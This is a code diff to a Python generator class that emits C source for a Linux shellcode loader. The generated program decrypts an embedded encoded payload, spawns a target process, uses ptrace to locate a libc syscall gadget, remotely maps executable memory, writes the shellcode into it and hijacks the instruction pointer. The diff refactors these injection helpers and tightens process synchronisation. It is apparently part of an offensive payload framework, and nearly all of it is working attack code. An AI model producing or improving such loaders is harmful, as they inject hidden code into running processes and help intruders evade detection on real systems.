@@ -24,101 +24,25 @@ class PtraceInjectBuilder(LinuxInjectionBuilder):
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <sys/user.h>
+#include <fcntl.h>
 #include <signal.h>
 #include <errno.h>
 
 char* enc_payload = "{encoded_payload}";
 char* target_cmd = "{cmd}";
 
-#ifndef PTRACE_SYSCALL
-#define PTRACE_SYSCALL 24
-#endif
-
-static unsigned long find_syscall_gadget(pid_t pid)
-{{
-    char path[256];
-    char line[512];
-    unsigned long start = 0, end = 0;
-    FILE *maps;
-
-    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
-    maps = fopen(path, "r");
-    if (!maps) return 0;
-    while (fgets(line, sizeof(line), maps)) {{
-        if (strstr(line, "libc") && strstr(line, "r-xp")) {{
-            if (sscanf(line, "%lx-%lx", &start, &end) == 2)
-                break;
-        }}
-    }}
-    fclose(maps);
-    if (!start || end <= start) return 0;
-
-    for (unsigned long addr = start; addr + 2 < end; addr++) {{
-        errno = 0;
-        long word = ptrace(PTRACE_PEEKTEXT, pid, (void *)addr, NULL);
-        if (errno) continue;
-        if ((word & 0xffffff) == 0xc3050f)
-            return addr;
-    }}
-    return 0;
-}}
-
-static long remote_syscall6_attached(pid_t pid, struct user_regs_struct *saved,
-    long nr, unsigned long a0, unsigned long a1, unsigned long a2,
-    unsigned long a3, unsigned long a4, unsigned long a5)
-{{
-    struct user_regs_struct regs;
-    unsigned long gadget;
-    int status;
-
-    gadget = find_syscall_gadget(pid);
-    if (!gadget) return -1;
-
-    regs = *saved;
-    regs.orig_rax = nr;
-    regs.rax = nr;
-    regs.rdi = a0;
-    regs.rsi = a1;
-    regs.rdx = a2;
-    regs.r10 = a3;
-    regs.r8 = a4;
-    regs.r9 = a5;
-    regs.rip = gadget;
-
-    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
-        return -1;
-    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
-        return -1;
-    waitpid(pid, &status, 0);
-    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
-        return -1;
-    return (long)regs.rax;
-}}
-
-static unsigned long remote_mmap_attached(pid_t pid, struct user_regs_struct *saved, size_t len)
-{{
-    return (unsigned long)remote_syscall6_attached(
-        pid, saved, 9, 0, len,
-        PROT_READ | PROT_WRITE | PROT_EXEC,
-        MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0);
-}}
-
+{self.ptrace_remote_syscall_helpers()}
 static int ptrace_inject(pid_t pid, unsigned char *sc, size_t len)
 {{
     struct user_regs_struct saved, regs;
     unsigned long remote_base;
     size_t i;
-    int status;
-
-    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
-        return -1;
-    waitpid(pid, &status, 0);
 
     if (ptrace(PTRACE_GETREGS, pid, NULL, &saved) < 0)
         goto fail;
 
     remote_base = remote_mmap_attached(pid, &saved, len);
-    if (!remote_base || remote_base == (unsigned long)-1)
+    if (!remote_base || remote_base >= (unsigned long)-4095UL)
         goto fail;
 
     for (i = 0; i < len; i += sizeof(long)) {{
@@ -130,8 +54,10 @@ static int ptrace_inject(pid_t pid, unsigned char *sc, size_t len)
             goto fail;
     }}
 
-    regs = saved;
+    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
+        goto fail;
     regs.rip = remote_base;
+    regs.rax = 0;
     if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
         goto fail;
     ptrace(PTRACE_DETACH, pid, NULL, NULL);
@@ -142,24 +68,20 @@ fail:
     return -1;
 }}
 
-static pid_t spawn_target(void)
-{{
-    pid_t pid = fork();
-    if (pid == 0) {{
-        execl("/bin/sh", "sh", "-c", target_cmd, (char *)NULL);
-        _exit(127);
-    }}
-    return pid;
-}}
-
 int main(void)
 {{
     pid_t target;
 {self.decode_preamble()}
 {self.decrypt_block(key, iv)}
-    target = spawn_target();
+    target = spawn_traceable_target(target_cmd);
     if (target < 0) return 1;
-    usleep(200000);
+    if (wait_until_execed(target) != 0) {{
+        kill(target, SIGKILL);
+        waitpid(target, NULL, 0);
+        munmap(shellcode_buf, (size_t)payload_size);
+        free(decoded);
+        return 1;
+    }}
     if (ptrace_inject(target, shellcode_buf, (size_t)payload_size) != 0) {{
         kill(target, SIGKILL);
         waitpid(target, NULL, 0);
